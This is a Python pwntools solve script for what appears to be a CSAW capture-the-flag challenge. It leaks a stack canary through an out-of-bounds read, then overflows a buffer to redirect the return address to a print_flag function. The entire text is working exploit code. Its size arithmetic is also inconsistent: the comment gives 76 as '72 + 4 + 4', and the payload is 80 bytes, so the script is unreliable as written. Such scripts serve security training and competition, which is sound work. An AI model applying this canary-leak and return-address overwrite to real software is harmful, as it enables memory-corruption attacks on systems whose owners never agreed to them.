from pwn import *

def leak_byte(p, index):
    p.sendline(b'V')
    p.sendline(str(index).encode())
    p.recvuntil(b'Value : ')
    value = p.recv(1)
    return value

# Connect to the server
p = remote('pwn.chal.csaw.io', 7900)

# Leak the canary byte by byte (indices 64-67)
canary = b''
for i in range(64, 68):
    p.recvuntil(b'> ')
    byte = leak_byte(p, i)
    canary += byte

print(f"Leaked canary: {canary.hex()}")

# Now send 'E' to edit
p.recvuntil(b'> ')
p.sendline(b'E')

# Send the size (76 bytes: 72 for padding + 4 for canary + 4 for return address)
p.sendline(b'76')

# Create the payload
# 72 bytes of padding (A's)
# 4 bytes for the leaked canary
# 4 bytes for the return address (print_flag: 0x08049304 in little-endian)
payload = b'A' * 72 + canary + b'\x04\x93\x04\x08'

# Send the payload
p.send(payload)

# Receive and print the flag
print(p.recvall().decode('ascii'))
